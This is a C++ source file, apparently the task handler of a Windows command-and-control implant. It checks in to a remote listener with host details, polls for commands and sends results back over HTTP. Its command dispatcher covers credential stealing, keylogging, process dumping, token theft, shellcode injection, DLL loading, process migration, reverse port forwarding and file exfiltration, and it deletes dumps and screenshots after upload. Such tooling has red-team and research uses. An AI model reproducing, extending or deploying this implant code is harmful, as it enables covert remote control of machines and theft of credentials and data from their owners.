#include "core/handler.hpp"

namespace Handler
{
    VOID HTTPInit(State::PState pState)
    {
		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            pState->pProcs,
            pState->lpListenerHost,
            pState->nListenerPort
        );

        pState->hSession = handlers.hSession;
        pState->hConnect = handlers.hConnect;
    }

    VOID HTTPClose(State::PState pState)
    {
        System::Http::WinHttpCloseHandles(
            pState->pProcs,
            pState->hSession,
            pState->hConnect,
            pState->hRequest
        );
    }

    std::wstring GetInitialInfoJSON(State::PState pState)
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wListenerURL = L"";
        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(pState->nSleep));
        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(pState->nJitter));
        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(pState->nKillDate));

        // Get listener URL
        wListenerURL += std::wstring(pState->lpListenerProto);
        wListenerURL += L"://";
        wListenerURL +=	std::wstring(pState->lpListenerHost);
        wListenerURL +=	L":";
        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(pState->nListenerPort));

        // Get architecture
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);
        }

        std::wstring wJson = L"{";
        wJson += L"\"os\":\"" + wOS + L"\"";
        wJson += L",";
        wJson += L"\"arch\":\"" + wArch + L"\"";
        wJson += L",";
        wJson += L"\"hostname\":\"" + wHostname + L"\"";
        wJson += L",";
        wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
        wJson += L",";
        wJson += L"\"implantType\":\"" + std::wstring(pState->lpPayloadType) + L"\"";
        wJson += L",";
        wJson += L"\"sleep\":" + wSleep + L"";
        wJson += L",";
        wJson += L"\"jitter\":" + wJitter + L"";
        wJson += L",";
        wJson += L"\"killDate\":" + wKillDate + L"";
        wJson += L"}";

        return wJson;
    }

    // If success, gets the agent UUID. This value will be used for subsequent processes.
    BOOL CheckIn(
        State::PState pState,
        const std::wstring& wInfoJson
    ) {
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathCheckIn,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        // Receive the agent UUID.
        pState->wUUID = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
        
        return TRUE;
    }

    BOOL TaskGet(State::PState pState)
    {
        std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathTaskGet,
            L"GET",
            wHeader.c_str(),
            NULL,
            0
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        pState->hRequest = resp.hRequest;

        pState->wTask = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);

        return TRUE;
    }

    BOOL TaskExecute(State::PState pState)
    {
        std::wstring task = pState->wTask;

        if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
        {
            pState->wTaskResult = Task::Cat(task.substr(4, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
        {
            pState->wTaskResult = Task::Cd(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"connect ") == 0)
        {
            pState->wTaskResult = Task::Connect(pState, task.substr(8, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::Cp(wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"creds steal") == 0)
        {
            pState->wTaskResult = Task::CredsSteal();
        }
        else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }
            std::wstring wDllSrc;
            for (size_t i = 2; i < wArgs.size(); i++)
            {
                wDllSrc += wArgs[i];
            }

            pState->wTaskResult = Task::Dll(pState, wArgs[1], wDllSrc);
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::Download(pState, wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"env") == 0)
        {
            pState->wTaskResult = Task::EnvLs();
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
        {
            pState->wTaskResult = Task::Execute(task.substr(8, task.size()));
        }
        else if (wcscmp(task.c_str(), L"groups") == 0)
        {
            pState->wTaskResult = Task::Groups();
        }
        else if (wcscmp(task.c_str(), L"history") == 0)
        {
            pState->wTaskResult = Task::History();
        }
        else if (wcscmp(task.c_str(), L"ip") == 0)
        {
            pState->wTaskResult = Task::Ip();
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
        {
            pState->wTaskResult = Task::KeyLog(task.substr(7, task.size()));
        }
        else if (wcscmp(task.c_str(), L"kill") == 0)
        {
            pState->wTaskResult = Task::Kill(pState);
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
        {
            pState->wTaskResult = Task::Ls(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
        {
            pState->wTaskResult = Task::Migrate(task.substr(8, task.size()));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
        {
            pState->wTaskResult = Task::Mkdir(task.substr(6, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::Mv(wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"net") == 0)
        {
            pState->wTaskResult = Task::Net();
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
        {
            pState->wTaskResult = Task::Procdump(task.substr(9, task.size()));
        }
        else if (wcscmp(task.c_str(), L"ps") == 0)
        {
            pState->wTaskResult = Task::Ps();
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
        {
            pState->wTaskResult = Task::PsKill(task.substr(8, task.size()));
        }
        else if (wcscmp(task.c_str(), L"pwd") == 0)
        {
            pState->wTaskResult = Task::Pwd();
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 5)
            {
                return FALSE;
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }

            pState->wTaskResult = Task::RegSubKeys(wRootKey, wSubKey, bRecurse);
        }
        else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 5)
            {
                return FALSE;
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }

            pState->wTaskResult = Task::RegValues(wRootKey, wSubKey, bRecurse);
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
        {
            pState->wTaskResult = Task::Rm(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
        {
            pState->wTaskResult = Task::Rmdir(task.substr(6, task.size()));
        }
        else if (wcscmp(task.substr(0, 13).c_str(), L"rportfwd add ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 6)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::RportfwdAdd(pState, wArgs[2], wArgs[3], wArgs[4], wArgs[5]);
        }
        else if (wcscmp(task.substr(0, 11).c_str(), L"rportfwd ls") == 0)
        {
            pState->wTaskResult = Task::RportfwdLs(pState);
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"rportfwd rm ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 4)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::RportfwdRm(wArgs[2], wArgs[3]);
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() < 3)
            {
                return FALSE;
            }
            std::wstring wUser = wArgs[1];
            std::wstring wPassword = wArgs[2];
            std::wstring wCmd;
            for (size_t i = 3; i < wArgs.size(); i++)
            {
                wCmd += wArgs[i];
            }

            pState->wTaskResult = Task::RunAs(wUser, wPassword, wCmd);
        }
        else if (wcscmp(task.c_str(), L"screenshot") == 0)
        {
            // Is DLL implant, the screenshot feature is not available.
            #ifndef IS_DLL
            pState->wTaskResult = Task::Screenshot(pState);
            #else
            pState->wTaskResult = L"Cannot take a screenshot on DLL";
            #endif
        }
        else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
        {
            // Parse arguments
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }
            std::wstring wPid = wArgs[1];
            std::wstring wSrc;
            for (size_t i = 2; i < wArgs.size(); i++)
            {
                wSrc += wArgs[i];
            }

            pState->wTaskResult = Task::Shellcode(pState, wArgs[1], wSrc);
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
        {
            pState->wTaskResult = Task::Sleep(pState, task.substr(6, task.size()));
        }
        else if (wcscmp(task.c_str(), L"token revert") == 0)
        {
            pState->wTaskResult = Task::TokenRevert();
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 4)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::TokenSteal(wArgs[2], wArgs[3]);
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
            if (wArgs.size() != 3)
            {
                return FALSE;
            }

            pState->wTaskResult = Task::Upload(pState, wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"users") == 0)
        {
            pState->wTaskResult = Task::Users();
        }
        else if (wcscmp(task.c_str(), L"whoami") == 0)
        {
            pState->wTaskResult = Task::Whoami();
        }
        else if (wcscmp(task.c_str(), L"whoami priv") == 0)
        {
            pState->wTaskResult = Task::WhoamiPriv();
        }
        else
        {
            pState->wTaskResult = L"Error: Invalid task.";
        }

        return TRUE;
    }

    BOOL TaskResultSend(State::PState pState)
    {
        System::Http::WinHttpResponse resp;

        // Prepare additional headers
        std::wstring wHeaders;
        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n" + L"X-Task: " + pState->wTask + L"\r\n";

        // When the "procdump" and "screenshot" tasks,
        // read bytes of the captured image file and send them.
        if (
            (wcscmp(pState->wTask.substr(0, 9).c_str(), L"procdump ") == 0) ||
            (wcscmp(pState->wTask.c_str(), L"screenshot") == 0)
        ) {
            std::wstring wFilePath = pState->wTaskResult;

            // Read file data
            std::vector<char> fileData = System::Fs::ReadBytesFromFile(wFilePath);

            // Delete file
            DeleteFile(wFilePath.c_str());

            resp = System::Http::SendRequest(
                pState->pProcs,
                pState->hConnect,
                pState->lpListenerHost,
                pState->nListenerPort,
                pState->lpReqPathTaskResult,
                L"POST",
                wHeaders.c_str(),
                (LPVOID)fileData.data(),
                (DWORD)fileData.size()
            );
        }
        else
        {
            // I couln't retrieve the `wstring` length correctly, so use `string` here.
            std::string sTaskResult = Utils::Convert::UTF8Encode(pState->wTaskResult);

            resp = System::Http::SendRequest(
                pState->pProcs,
                pState->hConnect,
                pState->lpListenerHost,
                pState->nListenerPort,
                pState->lpReqPathTaskResult,
                L"POST",
                wHeaders.c_str(),
                (LPVOID)sTaskResult.c_str(),
                (DWORD)strlen(sTaskResult.c_str())
            );
        }

        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        return TRUE;
    }

    BOOL Task(State::PState pState)
    {
        if (Handler::TaskGet(pState))
        {
            Handler::TaskExecute(pState);
            Handler::TaskResultSend(pState);
            return TRUE;
        }

        return FALSE;
    }

    BOOL SocketAccept(State::PState pState)
    {
        Socket::PSOCKET_DATA pSocket = NULL;
        Socket::PSOCKET_DATA pClientSocket  = NULL;
        SOCKET clientSocket = 0;
        u_long ulIOBlock = 1;

        pSocket = pState->pSocket;
        
        while (true)
        {
            if (!pSocket)
                break;

            if (pSocket->bShouldRemove)
            {
                pSocket = pSocket->next;
                continue;
            }

            // Accept connections
            if (pSocket->dwType == SOCKET_TYPE_REVERSE_PORT_FORWARDING)
            {
                clientSocket = accept(pSocket->socket, NULL, NULL);
                if (clientSocket != INVALID_SOCKET)
                {
                    if (ioctlsocket(clientSocket, FIONBIO, &ulIOBlock) != SOCKET_ERROR)
                    {
                        pClientSocket = Socket::NewSocket(
                            SOCKET_TYPE_CLIENT,
                            pSocket->dwLIP,
                            pSocket->dwLPort,
                            pSocket->dwFwdIP,
                            pSocket->dwFwdPort,
                            pSocket->dwID
                        );
                        if (!pClientSocket)
                        {
                            continue;
                        }

                        // Send the socket open request.
                        // System::Http::SendRequest(
                        //     pState->hConnect,
                        //     pState->lpListenerHost,
                        //     pState->nListenerPort,
                        //     ...
                        // )
                    }
                }
            }

            pSocket = pSocket->next;
        }

        return TRUE;
    }

    // Reference:
    // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/Socket.c#L281
    BOOL SocketRead(State::PState pState)
    {
        Socket::PSOCKET_DATA pSocket = NULL;
        PVOID newBuf = NULL;
        char recvBuf[512];
        int recvBufLen = 512;
        BOOL bResult = FALSE;
        int iResult, iSendResult;

        pSocket = pState->pSocket;

        while (true)
        {
            if (!pSocket)
                break;

            if (pSocket->bShouldRemove)
            {
                pSocket = pSocket->next;
                continue;
            }

            if (pSocket->dwType == SOCKET_TYPE_CLIENT)
            {
                // Read data from connected clients.
                do
                {
                    iResult = recv(pSocket->socket, recvBuf, recvBufLen, 0);
                    if (iResult > 0)
                    {
                        // Data received
                        // ...

                        
                        // Send data to connected clients
                        iSendResult = send(pSocket->socket, recvBuf, iResult, 0);
                        if (iSendResult == SOCKET_ERROR)
                        {
                        }
                    }
                } while (iResult > 0);
            }

            pSocket = pSocket->next;
        }

        return TRUE;
    }

    //
    // BOOL SocketClose(State::PState pState)
    // {

    // }

    // Kill every dead/removed socket.
    // BOOL SocketKill(State::PState pState)
    // {

    // }

    BOOL Socket(State::PState pState)
    {
        SocketAccept(pState);
        // SocketRead(pState);
        // SocketKill(pState);

        return TRUE;
    }
}



